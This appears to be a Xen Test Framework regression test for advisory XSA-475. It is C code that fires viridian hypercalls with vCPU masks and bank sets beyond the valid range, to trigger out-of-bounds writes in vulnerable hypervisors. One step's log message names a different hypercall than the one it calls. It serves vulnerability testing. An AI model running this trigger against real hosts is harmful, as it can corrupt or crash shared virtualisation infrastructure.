/**
 * @file tests/xsa-475/main.c
 * @ref test-xsa-475
 *
 * @page test-xsa-475 XSA-475
 *
 * Advisory: [XSA-475](https://xenbits.xen.org/xsa/advisory-475.html)
 *
 * Some bounds check were missing in viridian hypercalls, causing out of bound
 * writes (CVE-2025-58147) or operating on a wild pointer (CVE-2025-58148).
 * We can trigger it by targetting vCPUs ID that are over HVM_MAX_VCPUS.
 *
 * @see tests/xsa-475/main.c
 */

#include <xtf.h>

const char test_title[] = "XSA-475";

#define HVCALL_SEND_IPI 0x000b

#define HVCALL_FLUSH_VIRTUAL_ADDRESS_SPACE_EX  0x0013
#define HVCALL_FLUSH_VIRTUAL_ADDRESS_LIST_EX   0x0014
#define HVCALL_SEND_IPI_EX                     0x0015

enum HV_GENERIC_SET_FORMAT {
    HV_GENERIC_SET_SPARSE_4K,
    HV_GENERIC_SET_ALL,
};

struct hv_vpset {
    uint64_t format;
    uint64_t valid_bank_mask;
    uint64_t bank_contents[64];
};

static void test_send_ipi(uint64_t vcpu_mask)
{
    struct {
        uint32_t vector;
        uint8_t target_vtl;
        uint8_t reserved_zero[3];
        uint64_t vcpu_mask;
    } input_params = { 0 };

    input_params.vector = 0xD0;
    input_params.vcpu_mask = vcpu_mask & ~1; /* Don't self-ipi */

    if (vendor_is_intel)
        asm volatile ("vmcall" :: "a"(0x80000000U), "c"(HVCALL_SEND_IPI),
                                  "d"(&input_params) : "memory");
    else if (vendor_is_amd)
        asm volatile ("vmmcall" :: "a"(0x80000000U), "c"(HVCALL_SEND_IPI),
                                   "d"(&input_params) : "memory");
}

static void test_send_ipi_ex(struct hv_vpset set)
{
    int ret = 0;
    struct {
        uint64_t address_space;
        uint64_t flags;
        struct hv_vpset set;
    } input_params;

    input_params.address_space = 0;
    input_params.flags = 0;
    input_params.set = set;

    if (vendor_is_intel)
        asm volatile ("vmcall" : "=a"(ret) : "a"(0x80000000U),
                                 "c"(HVCALL_SEND_IPI_EX),
                                 "d"(&input_params) : "memory");
    else if (vendor_is_amd)
        asm volatile ("vmmcall" : "=a"(ret) : "a"(0x80000000U),
                                  "c"(HVCALL_SEND_IPI_EX),
                                  "d"(&input_params) : "memory");
}

static void test_flush_vaddr_ex(struct hv_vpset set)
{
    int ret = 0;
    struct {
        uint64_t address_space;
        uint64_t flags;
        struct hv_vpset set;
    } input_params;

    input_params.address_space = 0;
    input_params.flags = 0;
    input_params.set = set;

    if (vendor_is_intel)
        asm volatile ("vmcall" : "=a"(ret) : "a"(0x80000000U),
                                 "c"(HVCALL_FLUSH_VIRTUAL_ADDRESS_SPACE_EX),
                                 "d"(&input_params) : "memory");
    else if (vendor_is_amd)
        asm volatile ("vmmcall" : "=a"(ret) : "a"(0x80000000U),
                                  "c"(HVCALL_FLUSH_VIRTUAL_ADDRESS_SPACE_EX),
                                  "d"(&input_params) : "memory");
    }

void test_main(void)
{
    struct hv_vpset set;
    set.format = HV_GENERIC_SET_SPARSE_4K;

    printk("Test HVCALL_SEND_IPI to 64 first CPUs (non-existent)\n");
    test_send_ipi(~0);

    printk("Test HVCALL_FLUSH_VIRTUAL_ADDRESS_SPACE_EX with all banks set\n");
    set.valid_bank_mask = ~0;
    memset(set.bank_contents, 1, sizeof(set.bank_contents));
    test_flush_vaddr_ex(set);

    printk("Test HVCALL_FLUSH_VIRTUAL_ADDRESS_SPACE_EX with all banks set (skipping self)\n");
    set.valid_bank_mask = ~0;
    memset(set.bank_contents, 1, sizeof(set.bank_contents));
    set.bank_contents[0] &= 1; /* don't self-ipi */
    test_send_ipi_ex(set);

    xtf_success("Success: Probably not vulnerable to XSA-475\n");
}

